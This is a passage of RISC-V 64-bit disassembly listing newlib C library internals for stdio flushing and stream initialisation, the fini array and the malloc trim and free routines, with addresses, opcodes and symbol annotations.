   1291e:	777d                	lui	a4,0xfffff
   12920:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc78df>
   12924:	8ff9                	and	a5,a5,a4
   12926:	6c14                	ld	a3,24(s0)
   12928:	0107979b          	slliw	a5,a5,0x10
   1292c:	4107d79b          	sraiw	a5,a5,0x10
   12930:	00f41823          	sh	a5,16(s0)
   12934:	00042423          	sw	zero,8(s0)
   12938:	e014                	sd	a3,0(s0)
   1293a:	03379713          	slli	a4,a5,0x33
   1293e:	f40755e3          	bgez	a4,12888 <__sflush_r+0xa8>
   12942:	e848                	sd	a0,144(s0)
   12944:	b791                	j	12888 <__sflush_r+0xa8>
   12946:	0009a783          	lw	a5,0(s3)
   1294a:	ee0787e3          	beqz	a5,12838 <__sflush_r+0x58>
   1294e:	4775                	li	a4,29
   12950:	00e78563          	beq	a5,a4,1295a <__sflush_r+0x17a>
   12954:	4759                	li	a4,22
   12956:	f8e79ee3          	bne	a5,a4,128f2 <__sflush_r+0x112>
   1295a:	0099a023          	sw	s1,0(s3)
   1295e:	4501                	li	a0,0
   12960:	b791                	j	128a4 <__sflush_r+0xc4>
   12962:	777d                	lui	a4,0xfffff
   12964:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc78df>
   12968:	6c14                	ld	a3,24(s0)
   1296a:	8ff9                	and	a5,a5,a4
   1296c:	b7d1                	j	12930 <__sflush_r+0x150>
   1296e:	0407e793          	ori	a5,a5,64
   12972:	00f41823          	sh	a5,16(s0)
   12976:	557d                	li	a0,-1
   12978:	b735                	j	128a4 <__sflush_r+0xc4>

000000000001297a <_fflush_r>:
   1297a:	1101                	addi	sp,sp,-32
   1297c:	e822                	sd	s0,16(sp)
   1297e:	ec06                	sd	ra,24(sp)
   12980:	842a                	mv	s0,a0
   12982:	c119                	beqz	a0,12988 <_fflush_r+0xe>
   12984:	493c                	lw	a5,80(a0)
   12986:	cb89                	beqz	a5,12998 <_fflush_r+0x1e>
   12988:	01059783          	lh	a5,16(a1)
   1298c:	ef89                	bnez	a5,129a6 <_fflush_r+0x2c>
   1298e:	60e2                	ld	ra,24(sp)
   12990:	6442                	ld	s0,16(sp)
   12992:	4501                	li	a0,0
   12994:	6105                	addi	sp,sp,32
   12996:	8082                	ret
   12998:	e42e                	sd	a1,8(sp)
   1299a:	276000ef          	jal	ra,12c10 <__sinit>
   1299e:	65a2                	ld	a1,8(sp)
   129a0:	01059783          	lh	a5,16(a1)
   129a4:	d7ed                	beqz	a5,1298e <_fflush_r+0x14>
   129a6:	8522                	mv	a0,s0
   129a8:	6442                	ld	s0,16(sp)
   129aa:	60e2                	ld	ra,24(sp)
   129ac:	6105                	addi	sp,sp,32
   129ae:	bd0d                	j	127e0 <__sflush_r>

00000000000129b0 <fflush>:
   129b0:	85aa                	mv	a1,a0
   129b2:	c501                	beqz	a0,129ba <fflush+0xa>
   129b4:	8501b503          	ld	a0,-1968(gp) # 1f5f8 <_impure_ptr>
   129b8:	b7c9                	j	1297a <_fflush_r>
   129ba:	00000597          	auipc	a1,0x0
   129be:	fc058593          	addi	a1,a1,-64 # 1297a <_fflush_r>
   129c2:	8301b503          	ld	a0,-2000(gp) # 1f5d8 <_global_impure_ptr>
   129c6:	1790006f          	j	1333e <_fwalk_reent>

00000000000129ca <__fp_lock>:
   129ca:	4501                	li	a0,0
   129cc:	8082                	ret

00000000000129ce <_cleanup_r>:
   129ce:	00007597          	auipc	a1,0x7
   129d2:	37858593          	addi	a1,a1,888 # 19d46 <_fclose_r>
   129d6:	1690006f          	j	1333e <_fwalk_reent>

00000000000129da <__sinit.part.0>:
   129da:	7139                	addi	sp,sp,-64
   129dc:	fc06                	sd	ra,56(sp)
   129de:	f822                	sd	s0,48(sp)
   129e0:	f426                	sd	s1,40(sp)
   129e2:	f04a                	sd	s2,32(sp)
   129e4:	ec4e                	sd	s3,24(sp)
   129e6:	e852                	sd	s4,16(sp)
   129e8:	e456                	sd	s5,8(sp)
   129ea:	e05a                	sd	s6,0(sp)
   129ec:	6500                	ld	s0,8(a0)
   129ee:	00000717          	auipc	a4,0x0
   129f2:	fe070713          	addi	a4,a4,-32 # 129ce <_cleanup_r>
   129f6:	ed38                	sd	a4,88(a0)
   129f8:	53850793          	addi	a5,a0,1336
   129fc:	470d                	li	a4,3
   129fe:	52e52423          	sw	a4,1320(a0)
   12a02:	52f53823          	sd	a5,1328(a0)
   12a06:	52053023          	sd	zero,1312(a0)
   12a0a:	4791                	li	a5,4
   12a0c:	892a                	mv	s2,a0
   12a0e:	c81c                	sw	a5,16(s0)
   12a10:	4621                	li	a2,8
   12a12:	4581                	li	a1,0
   12a14:	0a042623          	sw	zero,172(s0)
   12a18:	00043023          	sd	zero,0(s0)
   12a1c:	00043423          	sd	zero,8(s0)
   12a20:	00043c23          	sd	zero,24(s0)
   12a24:	02042023          	sw	zero,32(s0)
   12a28:	02042423          	sw	zero,40(s0)
   12a2c:	0a440513          	addi	a0,s0,164
   12a30:	d31fd0ef          	jal	ra,10760 <memset>
   12a34:	01093483          	ld	s1,16(s2)
   12a38:	00004b17          	auipc	s6,0x4
   12a3c:	594b0b13          	addi	s6,s6,1428 # 16fcc <__sread>
   12a40:	00004a97          	auipc	s5,0x4
   12a44:	5c8a8a93          	addi	s5,s5,1480 # 17008 <__swrite>
   12a48:	00004a17          	auipc	s4,0x4
   12a4c:	614a0a13          	addi	s4,s4,1556 # 1705c <__sseek>
   12a50:	00004997          	auipc	s3,0x4
   12a54:	64e98993          	addi	s3,s3,1614 # 1709e <__sclose>
   12a58:	67c1                	lui	a5,0x10
   12a5a:	03643c23          	sd	s6,56(s0)
   12a5e:	05543023          	sd	s5,64(s0)
   12a62:	05443423          	sd	s4,72(s0)
   12a66:	05343823          	sd	s3,80(s0)
   12a6a:	f800                	sd	s0,48(s0)
   12a6c:	07a5                	addi	a5,a5,9
   12a6e:	c89c                	sw	a5,16(s1)
   12a70:	4621                	li	a2,8
   12a72:	4581                	li	a1,0
   12a74:	0a04a623          	sw	zero,172(s1)
   12a78:	0004b023          	sd	zero,0(s1)
   12a7c:	0004b423          	sd	zero,8(s1)
   12a80:	0004bc23          	sd	zero,24(s1)
   12a84:	0204a023          	sw	zero,32(s1)
   12a88:	0204a423          	sw	zero,40(s1)
   12a8c:	0a448513          	addi	a0,s1,164
   12a90:	cd1fd0ef          	jal	ra,10760 <memset>
   12a94:	01893403          	ld	s0,24(s2)
   12a98:	000207b7          	lui	a5,0x20
   12a9c:	0364bc23          	sd	s6,56(s1)
   12aa0:	0554b023          	sd	s5,64(s1)
   12aa4:	0544b423          	sd	s4,72(s1)
   12aa8:	0534b823          	sd	s3,80(s1)
   12aac:	f884                	sd	s1,48(s1)
   12aae:	07c9                	addi	a5,a5,18
   12ab0:	c81c                	sw	a5,16(s0)
   12ab2:	0a042623          	sw	zero,172(s0)
   12ab6:	00043023          	sd	zero,0(s0)
   12aba:	00043423          	sd	zero,8(s0)
   12abe:	00043c23          	sd	zero,24(s0)
   12ac2:	02042023          	sw	zero,32(s0)
   12ac6:	02042423          	sw	zero,40(s0)
   12aca:	0a440513          	addi	a0,s0,164
   12ace:	4621                	li	a2,8
   12ad0:	4581                	li	a1,0
   12ad2:	c8ffd0ef          	jal	ra,10760 <memset>
   12ad6:	70e2                	ld	ra,56(sp)
   12ad8:	03643c23          	sd	s6,56(s0)
   12adc:	05543023          	sd	s5,64(s0)
   12ae0:	05443423          	sd	s4,72(s0)
   12ae4:	05343823          	sd	s3,80(s0)
   12ae8:	f800                	sd	s0,48(s0)
   12aea:	7442                	ld	s0,48(sp)
   12aec:	4785                	li	a5,1
   12aee:	04f92823          	sw	a5,80(s2)
   12af2:	74a2                	ld	s1,40(sp)
   12af4:	7902                	ld	s2,32(sp)
   12af6:	69e2                	ld	s3,24(sp)
   12af8:	6a42                	ld	s4,16(sp)
   12afa:	6aa2                	ld	s5,8(sp)
   12afc:	6b02                	ld	s6,0(sp)
   12afe:	6121                	addi	sp,sp,64
   12b00:	8082                	ret

0000000000012b02 <__fp_unlock>:
   12b02:	4501                	li	a0,0
   12b04:	8082                	ret

0000000000012b06 <__sfmoreglue>:
   12b06:	1101                	addi	sp,sp,-32
   12b08:	e426                	sd	s1,8(sp)
   12b0a:	0b000613          	li	a2,176
   12b0e:	fff5849b          	addiw	s1,a1,-1
   12b12:	02c484b3          	mul	s1,s1,a2
   12b16:	e04a                	sd	s2,0(sp)
   12b18:	892e                	mv	s2,a1
   12b1a:	e822                	sd	s0,16(sp)
   12b1c:	ec06                	sd	ra,24(sp)
   12b1e:	0c848593          	addi	a1,s1,200
   12b22:	315020ef          	jal	ra,15636 <_malloc_r>
   12b26:	842a                	mv	s0,a0
   12b28:	cd01                	beqz	a0,12b40 <__sfmoreglue+0x3a>
   12b2a:	0561                	addi	a0,a0,24
   12b2c:	00043023          	sd	zero,0(s0)
   12b30:	01242423          	sw	s2,8(s0)
   12b34:	e808                	sd	a0,16(s0)
   12b36:	0b048613          	addi	a2,s1,176
   12b3a:	4581                	li	a1,0
   12b3c:	c25fd0ef          	jal	ra,10760 <memset>
   12b40:	60e2                	ld	ra,24(sp)
   12b42:	8522                	mv	a0,s0
   12b44:	6442                	ld	s0,16(sp)
   12b46:	64a2                	ld	s1,8(sp)
   12b48:	6902                	ld	s2,0(sp)
   12b4a:	6105                	addi	sp,sp,32
   12b4c:	8082                	ret

0000000000012b4e <__sfp>:
   12b4e:	7179                	addi	sp,sp,-48
   12b50:	ec26                	sd	s1,24(sp)
   12b52:	8301b483          	ld	s1,-2000(gp) # 1f5d8 <_global_impure_ptr>
   12b56:	48bc                	lw	a5,80(s1)
   12b58:	e84a                	sd	s2,16(sp)
   12b5a:	f406                	sd	ra,40(sp)
   12b5c:	f022                	sd	s0,32(sp)
   12b5e:	e44e                	sd	s3,8(sp)
   12b60:	892a                	mv	s2,a0
   12b62:	c3c9                	beqz	a5,12be4 <__sfp+0x96>
   12b64:	52048493          	addi	s1,s1,1312
   12b68:	0b000993          	li	s3,176
   12b6c:	449c                	lw	a5,8(s1)
   12b6e:	6880                	ld	s0,16(s1)
   12b70:	06f05663          	blez	a5,12bdc <__sfp+0x8e>
   12b74:	37fd                	addiw	a5,a5,-1
   12b76:	1782                	slli	a5,a5,0x20
   12b78:	9381                	srli	a5,a5,0x20
   12b7a:	0785                	addi	a5,a5,1
   12b7c:	033787b3          	mul	a5,a5,s3
   12b80:	97a2                	add	a5,a5,s0
   12b82:	a029                	j	12b8c <__sfp+0x3e>
   12b84:	0b040413          	addi	s0,s0,176
   12b88:	04878a63          	beq	a5,s0,12bdc <__sfp+0x8e>
   12b8c:	01041703          	lh	a4,16(s0)
   12b90:	fb75                	bnez	a4,12b84 <__sfp+0x36>
   12b92:	77c1                	lui	a5,0xffff0
   12b94:	0785                	addi	a5,a5,1
   12b96:	0a042623          	sw	zero,172(s0)
   12b9a:	00043023          	sd	zero,0(s0)
   12b9e:	00043423          	sd	zero,8(s0)
   12ba2:	c81c                	sw	a5,16(s0)
   12ba4:	00043c23          	sd	zero,24(s0)
   12ba8:	02042023          	sw	zero,32(s0)
   12bac:	02042423          	sw	zero,40(s0)
   12bb0:	4621                	li	a2,8
   12bb2:	4581                	li	a1,0
   12bb4:	0a440513          	addi	a0,s0,164
   12bb8:	ba9fd0ef          	jal	ra,10760 <memset>
   12bbc:	04043c23          	sd	zero,88(s0)
   12bc0:	06042023          	sw	zero,96(s0)
   12bc4:	06043c23          	sd	zero,120(s0)
   12bc8:	08042023          	sw	zero,128(s0)
   12bcc:	70a2                	ld	ra,40(sp)
   12bce:	8522                	mv	a0,s0
   12bd0:	7402                	ld	s0,32(sp)
   12bd2:	64e2                	ld	s1,24(sp)
   12bd4:	6942                	ld	s2,16(sp)
   12bd6:	69a2                	ld	s3,8(sp)
   12bd8:	6145                	addi	sp,sp,48
   12bda:	8082                	ret
   12bdc:	6080                	ld	s0,0(s1)
   12bde:	c419                	beqz	s0,12bec <__sfp+0x9e>
   12be0:	84a2                	mv	s1,s0
   12be2:	b769                	j	12b6c <__sfp+0x1e>
   12be4:	8526                	mv	a0,s1
   12be6:	df5ff0ef          	jal	ra,129da <__sinit.part.0>
   12bea:	bfad                	j	12b64 <__sfp+0x16>
   12bec:	4591                	li	a1,4
   12bee:	854a                	mv	a0,s2
   12bf0:	f17ff0ef          	jal	ra,12b06 <__sfmoreglue>
   12bf4:	e088                	sd	a0,0(s1)
   12bf6:	842a                	mv	s0,a0
   12bf8:	f565                	bnez	a0,12be0 <__sfp+0x92>
   12bfa:	47b1                	li	a5,12
   12bfc:	00f92023          	sw	a5,0(s2)
   12c00:	b7f1                	j	12bcc <__sfp+0x7e>

0000000000012c02 <_cleanup>:
   12c02:	00007597          	auipc	a1,0x7
   12c06:	14458593          	addi	a1,a1,324 # 19d46 <_fclose_r>
   12c0a:	8301b503          	ld	a0,-2000(gp) # 1f5d8 <_global_impure_ptr>
   12c0e:	af05                	j	1333e <_fwalk_reent>

0000000000012c10 <__sinit>:
   12c10:	493c                	lw	a5,80(a0)
   12c12:	c391                	beqz	a5,12c16 <__sinit+0x6>
   12c14:	8082                	ret
   12c16:	b3d1                	j	129da <__sinit.part.0>

0000000000012c18 <__sfp_lock_acquire>:
   12c18:	8082                	ret

0000000000012c1a <__sfp_lock_release>:
   12c1a:	8082                	ret

0000000000012c1c <__sinit_lock_acquire>:
   12c1c:	8082                	ret

0000000000012c1e <__sinit_lock_release>:
   12c1e:	8082                	ret

0000000000012c20 <__fp_lock_all>:
   12c20:	00000597          	auipc	a1,0x0
   12c24:	daa58593          	addi	a1,a1,-598 # 129ca <__fp_lock>
   12c28:	8501b503          	ld	a0,-1968(gp) # 1f5f8 <_impure_ptr>
   12c2c:	ad41                	j	132bc <_fwalk>

0000000000012c2e <__fp_unlock_all>:
   12c2e:	00000597          	auipc	a1,0x0
   12c32:	ed458593          	addi	a1,a1,-300 # 12b02 <__fp_unlock>
   12c36:	8501b503          	ld	a0,-1968(gp) # 1f5f8 <_impure_ptr>
   12c3a:	a549                	j	132bc <_fwalk>

0000000000012c3c <__libc_fini_array>:
   12c3c:	1101                	addi	sp,sp,-32
   12c3e:	e822                	sd	s0,16(sp)
   12c40:	0000b797          	auipc	a5,0xb
   12c44:	7c878793          	addi	a5,a5,1992 # 1e408 <__fini_array_end>
   12c48:	0000b417          	auipc	s0,0xb
   12c4c:	7b840413          	addi	s0,s0,1976 # 1e400 <__init_array_end>
   12c50:	8f81                	sub	a5,a5,s0
   12c52:	e426                	sd	s1,8(sp)
   12c54:	ec06                	sd	ra,24(sp)
   12c56:	4037d493          	srai	s1,a5,0x3
   12c5a:	c881                	beqz	s1,12c6a <__libc_fini_array+0x2e>
   12c5c:	17e1                	addi	a5,a5,-8
   12c5e:	943e                	add	s0,s0,a5
   12c60:	601c                	ld	a5,0(s0)
   12c62:	14fd                	addi	s1,s1,-1
   12c64:	1461                	addi	s0,s0,-8
   12c66:	9782                	jalr	a5
   12c68:	fce5                	bnez	s1,12c60 <__libc_fini_array+0x24>
   12c6a:	60e2                	ld	ra,24(sp)
   12c6c:	6442                	ld	s0,16(sp)
   12c6e:	64a2                	ld	s1,8(sp)
   12c70:	6105                	addi	sp,sp,32
   12c72:	8082                	ret

0000000000012c74 <_malloc_trim_r>:
   12c74:	7179                	addi	sp,sp,-48
   12c76:	f022                	sd	s0,32(sp)
   12c78:	ec26                	sd	s1,24(sp)
   12c7a:	e84a                	sd	s2,16(sp)
   12c7c:	e44e                	sd	s3,8(sp)
   12c7e:	e052                	sd	s4,0(sp)
   12c80:	89ae                	mv	s3,a1
   12c82:	f406                	sd	ra,40(sp)
   12c84:	0000ca17          	auipc	s4,0xc
   12c88:	114a0a13          	addi	s4,s4,276 # 1ed98 <__malloc_av_>
   12c8c:	892a                	mv	s2,a0
   12c8e:	26a030ef          	jal	ra,15ef8 <__malloc_lock>
   12c92:	010a3703          	ld	a4,16(s4)
   12c96:	6785                	lui	a5,0x1
   12c98:	fdf78413          	addi	s0,a5,-33 # fdf <register_fini-0xf0d1>
   12c9c:	6704                	ld	s1,8(a4)
   12c9e:	41340433          	sub	s0,s0,s3
   12ca2:	98f1                	andi	s1,s1,-4
   12ca4:	9426                	add	s0,s0,s1
   12ca6:	8031                	srli	s0,s0,0xc
   12ca8:	147d                	addi	s0,s0,-1
   12caa:	0432                	slli	s0,s0,0xc
   12cac:	00f44b63          	blt	s0,a5,12cc2 <_malloc_trim_r+0x4e>
   12cb0:	4581                	li	a1,0
   12cb2:	854a                	mv	a0,s2
   12cb4:	1d4040ef          	jal	ra,16e88 <_sbrk_r>
   12cb8:	010a3783          	ld	a5,16(s4)
   12cbc:	97a6                	add	a5,a5,s1
   12cbe:	00f50e63          	beq	a0,a5,12cda <_malloc_trim_r+0x66>
   12cc2:	854a                	mv	a0,s2
   12cc4:	236030ef          	jal	ra,15efa <__malloc_unlock>
   12cc8:	70a2                	ld	ra,40(sp)
   12cca:	7402                	ld	s0,32(sp)
   12ccc:	64e2                	ld	s1,24(sp)
   12cce:	6942                	ld	s2,16(sp)
   12cd0:	69a2                	ld	s3,8(sp)
   12cd2:	6a02                	ld	s4,0(sp)
   12cd4:	4501                	li	a0,0
   12cd6:	6145                	addi	sp,sp,48
   12cd8:	8082                	ret
   12cda:	408005b3          	neg	a1,s0
   12cde:	854a                	mv	a0,s2
   12ce0:	1a8040ef          	jal	ra,16e88 <_sbrk_r>
   12ce4:	57fd                	li	a5,-1
   12ce6:	02f50a63          	beq	a0,a5,12d1a <_malloc_trim_r+0xa6>
   12cea:	0c818713          	addi	a4,gp,200 # 1fe70 <__malloc_current_mallinfo>
   12cee:	431c                	lw	a5,0(a4)
   12cf0:	010a3683          	ld	a3,16(s4)
   12cf4:	8c81                	sub	s1,s1,s0
   12cf6:	0014e493          	ori	s1,s1,1
   12cfa:	4087843b          	subw	s0,a5,s0
   12cfe:	854a                	mv	a0,s2
   12d00:	e684                	sd	s1,8(a3)
   12d02:	c300                	sw	s0,0(a4)
   12d04:	1f6030ef          	jal	ra,15efa <__malloc_unlock>
   12d08:	70a2                	ld	ra,40(sp)
   12d0a:	7402                	ld	s0,32(sp)
   12d0c:	64e2                	ld	s1,24(sp)
   12d0e:	6942                	ld	s2,16(sp)
   12d10:	69a2                	ld	s3,8(sp)
   12d12:	6a02                	ld	s4,0(sp)
   12d14:	4505                	li	a0,1
   12d16:	6145                	addi	sp,sp,48
   12d18:	8082                	ret
   12d1a:	4581                	li	a1,0
   12d1c:	854a                	mv	a0,s2
   12d1e:	16a040ef          	jal	ra,16e88 <_sbrk_r>
   12d22:	010a3703          	ld	a4,16(s4)
   12d26:	46fd                	li	a3,31
   12d28:	40e507b3          	sub	a5,a0,a4
   12d2c:	f8f6dbe3          	bge	a3,a5,12cc2 <_malloc_trim_r+0x4e>
   12d30:	8581b683          	ld	a3,-1960(gp) # 1f600 <__malloc_sbrk_base>
   12d34:	8d15                	sub	a0,a0,a3
   12d36:	0017e793          	ori	a5,a5,1
   12d3a:	0ca1a423          	sw	a0,200(gp) # 1fe70 <__malloc_current_mallinfo>
   12d3e:	e71c                	sd	a5,8(a4)
   12d40:	b749                	j	12cc2 <_malloc_trim_r+0x4e>

0000000000012d42 <_free_r>:
   12d42:	c5f5                	beqz	a1,12e2e <_free_r+0xec>
   12d44:	1101                	addi	sp,sp,-32
   12d46:	e822                	sd	s0,16(sp)
   12d48:	e426                	sd	s1,8(sp)
   12d4a:	842e                	mv	s0,a1
   12d4c:	84aa                	mv	s1,a0
   12d4e:	ec06                	sd	ra,24(sp)
   12d50:	1a8030ef          	jal	ra,15ef8 <__malloc_lock>
   12d54:	ff843583          	ld	a1,-8(s0)
   12d58:	ff040713          	addi	a4,s0,-16
   12d5c:	0000c517          	auipc	a0,0xc
   12d60:	03c50513          	addi	a0,a0,60 # 1ed98 <__malloc_av_>
   12d64:	ffe5f793          	andi	a5,a1,-2
   12d68:	00f70633          	add	a2,a4,a5
   12d6c:	6614                	ld	a3,8(a2)
   12d6e:	01053803          	ld	a6,16(a0)
   12d72:	9af1                	andi	a3,a3,-4
   12d74:	14c80063          	beq	a6,a2,12eb4 <_free_r+0x172>
   12d78:	e614                	sd	a3,8(a2)
   12d7a:	8985                	andi	a1,a1,1
   12d7c:	00d60833          	add	a6,a2,a3
   12d80:	e1c1                	bnez	a1,12e00 <_free_r+0xbe>
   12d82:	ff043303          	ld	t1,-16(s0)
   12d86:	00883583          	ld	a1,8(a6)
   12d8a:	0000c897          	auipc	a7,0xc
   12d8e:	01e88893          	addi	a7,a7,30 # 1eda8 <__malloc_av_+0x10>
   12d92:	40670733          	sub	a4,a4,t1
   12d96:	01073803          	ld	a6,16(a4)
   12d9a:	979a                	add	a5,a5,t1
   12d9c:	8985                	andi	a1,a1,1
   12d9e:	0f180863          	beq	a6,a7,12e8e <_free_r+0x14c>
   12da2:	01873303          	ld	t1,24(a4)
   12da6:	00683c23          	sd	t1,24(a6)
   12daa:	01033823          	sd	a6,16(t1)
   12dae:	14058d63          	beqz	a1,12f08 <_free_r+0x1c6>
   12db2:	0017e693          	ori	a3,a5,1
   12db6:	e714                	sd	a3,8(a4)
   12db8:	e21c                	sd	a5,0(a2)
   12dba:	1ff00693          	li	a3,511
   12dbe:	08f6e263          	bltu	a3,a5,12e42 <_free_r+0x100>
   12dc2:	838d                	srli	a5,a5,0x3
   12dc4:	0017869b          	addiw	a3,a5,1
   12dc8:	0016969b          	slliw	a3,a3,0x1
   12dcc:	068e                	slli	a3,a3,0x3
   12dce:	00853803          	ld	a6,8(a0)
   12dd2:	96aa                	add	a3,a3,a0
   12dd4:	628c                	ld	a1,0(a3)
   12dd6:	4027d61b          	sraiw	a2,a5,0x2
   12dda:	4785                	li	a5,1
   12ddc:	00c797b3          	sll	a5,a5,a2
   12de0:	0107e7b3          	or	a5,a5,a6
   12de4:	ff068613          	addi	a2,a3,-16
   12de8:	ef10                	sd	a2,24(a4)
   12dea:	eb0c                	sd	a1,16(a4)
   12dec:	e51c                	sd	a5,8(a0)
   12dee:	e298                	sd	a4,0(a3)
   12df0:	ed98                	sd	a4,24(a1)
   12df2:	6442                	ld	s0,16(sp)
   12df4:	60e2                	ld	ra,24(sp)
   12df6:	8526                	mv	a0,s1
   12df8:	64a2                	ld	s1,8(sp)
   12dfa:	6105                	addi	sp,sp,32
   12dfc:	0fe0306f          	j	15efa <__malloc_unlock>
   12e00:	00883583          	ld	a1,8(a6)
   12e04:	8985                	andi	a1,a1,1
   12e06:	e58d                	bnez	a1,12e30 <_free_r+0xee>
   12e08:	97b6                	add	a5,a5,a3
   12e0a:	0000c897          	auipc	a7,0xc
   12e0e:	f9e88893          	addi	a7,a7,-98 # 1eda8 <__malloc_av_+0x10>
   12e12:	6a14                	ld	a3,16(a2)
   12e14:	0017e813          	ori	a6,a5,1
   12e18:	00f705b3          	add	a1,a4,a5
   12e1c:	11168063          	beq	a3,a7,12f1c <_free_r+0x1da>
   12e20:	6e10                	ld	a2,24(a2)
   12e22:	ee90                	sd	a2,24(a3)
   12e24:	ea14                	sd	a3,16(a2)
   12e26:	01073423          	sd	a6,8(a4)
   12e2a:	e19c                	sd	a5,0(a1)
   12e2c:	b779                	j	12dba <_free_r+0x78>
   12e2e:	8082                	ret
   12e30:	0017e693          	ori	a3,a5,1
   12e34:	fed43c23          	sd	a3,-8(s0)
   12e38:	e21c                	sd	a5,0(a2)
   12e3a:	1ff00693          	li	a3,511
   12e3e:	f8f6f2e3          	bgeu	a3,a5,12dc2 <_free_r+0x80>
   12e42:	0097d693          	srli	a3,a5,0x9
   12e46:	4611                	li	a2,4
   12e48:	08d66f63          	bltu	a2,a3,12ee6 <_free_r+0x1a4>
   12e4c:	0067d693          	srli	a3,a5,0x6
   12e50:	0396859b          	addiw	a1,a3,57
   12e54:	0015959b          	slliw	a1,a1,0x1
   12e58:	0386861b          	addiw	a2,a3,56
   12e5c:	058e                	slli	a1,a1,0x3
   12e5e:	95aa                	add	a1,a1,a0
   12e60:	6194                	ld	a3,0(a1)
   12e62:	15c1                	addi	a1,a1,-16
   12e64:	0cd58663          	beq	a1,a3,12f30 <_free_r+0x1ee>
   12e68:	6690                	ld	a2,8(a3)
   12e6a:	9a71                	andi	a2,a2,-4
   12e6c:	00c7f563          	bgeu	a5,a2,12e76 <_free_r+0x134>
   12e70:	6a94                	ld	a3,16(a3)
   12e72:	fed59be3          	bne	a1,a3,12e68 <_free_r+0x126>
   12e76:	6e8c                	ld	a1,24(a3)
   12e78:	ef0c                	sd	a1,24(a4)
   12e7a:	eb14                	sd	a3,16(a4)
   12e7c:	6442                	ld	s0,16(sp)
   12e7e:	60e2                	ld	ra,24(sp)
   12e80:	e998                	sd	a4,16(a1)
   12e82:	8526                	mv	a0,s1
   12e84:	64a2                	ld	s1,8(sp)
   12e86:	ee98                	sd	a4,24(a3)
   12e88:	6105                	addi	sp,sp,32
   12e8a:	0700306f          	j	15efa <__malloc_unlock>
   12e8e:	0e059d63          	bnez	a1,12f88 <_free_r+0x246>
   12e92:	6e0c                	ld	a1,24(a2)
   12e94:	6a10                	ld	a2,16(a2)
   12e96:	97b6                	add	a5,a5,a3
   12e98:	6442                	ld	s0,16(sp)
   12e9a:	ee0c                	sd	a1,24(a2)
   12e9c:	e990                	sd	a2,16(a1)
   12e9e:	0017e693          	ori	a3,a5,1
   12ea2:	60e2                	ld	ra,24(sp)
   12ea4:	e714                	sd	a3,8(a4)
   12ea6:	8526                	mv	a0,s1
   12ea8:	973e                	add	a4,a4,a5
   12eaa:	64a2                	ld	s1,8(sp)
   12eac:	e31c                	sd	a5,0(a4)
   12eae:	6105                	addi	sp,sp,32
   12eb0:	04a0306f          	j	15efa <__malloc_unlock>
   12eb4:	8985                	andi	a1,a1,1
   12eb6:	97b6                	add	a5,a5,a3
   12eb8:	e989                	bnez	a1,12eca <_free_r+0x188>
   12eba:	ff043583          	ld	a1,-16(s0)
   12ebe:	8f0d                	sub	a4,a4,a1
   12ec0:	6f14                	ld	a3,24(a4)
   12ec2:	6b10                	ld	a2,16(a4)
   12ec4:	97ae                	add	a5,a5,a1
   12ec6:	ee14                	sd	a3,24(a2)
   12ec8:	ea90                	sd	a2,16(a3)
   12eca:	0017e693          	ori	a3,a5,1
   12ece:	e714                	sd	a3,8(a4)
   12ed0:	e918                	sd	a4,16(a0)
   12ed2:	8601b703          	ld	a4,-1952(gp) # 1f608 <__malloc_trim_threshold>
   12ed6:	f0e7eee3          	bltu	a5,a4,12df2 <_free_r+0xb0>
   12eda:	8801b583          	ld	a1,-1920(gp) # 1f628 <__malloc_top_pad>
   12ede:	8526                	mv	a0,s1
   12ee0:	d95ff0ef          	jal	ra,12c74 <_malloc_trim_r>
   12ee4:	b739                	j	12df2 <_free_r+0xb0>
   12ee6:	4651                	li	a2,20
   12ee8:	02d67263          	bgeu	a2,a3,12f0c <_free_r+0x1ca>
   12eec:	05400613          	li	a2,84
   12ef0:	04d66b63          	bltu	a2,a3,12f46 <_free_r+0x204>
   12ef4:	00c7d693          	srli	a3,a5,0xc
   12ef8:	06f6859b          	addiw	a1,a3,111
   12efc:	0015959b          	slliw	a1,a1,0x1
   12f00:	06e6861b          	addiw	a2,a3,110
   12f04:	058e                	slli	a1,a1,0x3
   12f06:	bfa1                	j	12e5e <_free_r+0x11c>
   12f08:	97b6                	add	a5,a5,a3
   12f0a:	b721                	j	12e12 <_free_r+0xd0>
   12f0c:	05c6859b          	addiw	a1,a3,92
   12f10:	0015959b          	slliw	a1,a1,0x1
   12f14:	05b6861b          	addiw	a2,a3,91
   12f18:	058e                	slli	a1,a1,0x3
   12f1a:	b791                	j	12e5e <_free_r+0x11c>
   12f1c:	f518                	sd	a4,40(a0)
   12f1e:	f118                	sd	a4,32(a0)
   12f20:	01173c23          	sd	a7,24(a4)
   12f24:	01173823          	sd	a7,16(a4)
   12f28:	01073423          	sd	a6,8(a4)
   12f2c:	e19c                	sd	a5,0(a1)
   12f2e:	b5d1                	j	12df2 <_free_r+0xb0>
   12f30:	00853803          	ld	a6,8(a0)
   12f34:	4026561b          	sraiw	a2,a2,0x2
   12f38:	4785                	li	a5,1
   12f3a:	00c79633          	sll	a2,a5,a2
   12f3e:	01066633          	or	a2,a2,a6
   12f42:	e510                	sd	a2,8(a0)
   12f44:	bf15                	j	12e78 <_free_r+0x136>
   12f46:	15400613          	li	a2,340
   12f4a:	00d66c63          	bltu	a2,a3,12f62 <_free_r+0x220>
   12f4e:	00f7d693          	srli	a3,a5,0xf
   12f52:	0786859b          	addiw	a1,a3,120
   12f56:	0015959b          	slliw	a1,a1,0x1
   12f5a:	0776861b          	addiw	a2,a3,119
   12f5e:	058e                	slli	a1,a1,0x3
   12f60:	bdfd                	j	12e5e <_free_r+0x11c>
   12f62:	55400613          	li	a2,1364
   12f66:	00d66c63          	bltu	a2,a3,12f7e <_free_r+0x23c>
   12f6a:	0127d693          	srli	a3,a5,0x12
   12f6e:	07d6859b          	addiw	a1,a3,125
   12f72:	0015959b          	slliw	a1,a1,0x1
   12f76:	07c6861b          	addiw	a2,a3,124
   12f7a:	058e                	slli	a1,a1,0x3
   12f7c:	b5cd                	j	12e5e <_free_r+0x11c>
   12f7e:	7f000593          	li	a1,2032
   12f82:	07e00613          	li	a2,126
   12f86:	bde1                	j	12e5e <_free_r+0x11c>
   12f88:	0017e693          	ori	a3,a5,1
   12f8c:	e714                	sd	a3,8(a4)
   12f8e:	e21c                	sd	a5,0(a2)
   12f90:	b58d                	j	12df2 <_free_r+0xb0>

0000000000012f92 <__sfvwrite_r>:
   12f92:	6a1c                	ld	a5,16(a2)
